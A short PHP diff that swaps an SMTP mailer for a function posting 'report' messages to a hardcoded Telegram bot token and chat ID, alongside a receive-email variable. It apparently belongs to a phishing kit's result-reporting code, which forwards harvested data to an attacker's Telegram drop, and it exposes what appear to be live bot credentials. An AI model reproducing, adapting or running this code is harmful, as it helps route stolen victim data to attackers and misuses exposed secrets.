@@ -1,21 +1,16 @@
 <?php
-use PHPMailer\PHPMailer\PHPMailer;
-require_once dirname(__DIR__).'/vendor/autoload.php';
-
 $Receive_email = "top4lyfe@atomicmail.io";
 
 function send_report($to, $subject, $message) {
-    $mail = new PHPMailer(true);
-    $mail->isSMTP();
-    $mail->Host       = getenv('MAIL_HOST');
-    $mail->SMTPAuth   = true;
-    $mail->Username   = getenv('MAIL_USERNAME');
-    $mail->Password   = getenv('MAIL_PASSWORD');
-    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
-    $mail->Port       = getenv('MAIL_PORT');
-    $mail->setFrom(getenv('MAIL_FROM_ADDRESS'), getenv('MAIL_FROM_NAME'));
-    $mail->addAddress($to);
-    $mail->Subject = $subject;
-    $mail->Body    = $message;
-    $mail->send();
+    $token = '8877413739:AAGXqcPEdUMgf0JGK8B-qK7f-4Tfe3MeCCw';
+    $chat_id = '7576365237';
+    $text = $subject . "\n\n" . $message;
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    $data = http_build_query(['chat_id' => $chat_id, 'text' => $text]);
+    $ctx = stream_context_create(['http' => [
+        'method'  => 'POST',
+        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
+        'content' => $data,
+    ]]);
+    file_get_contents($url, false, $ctx);
 }
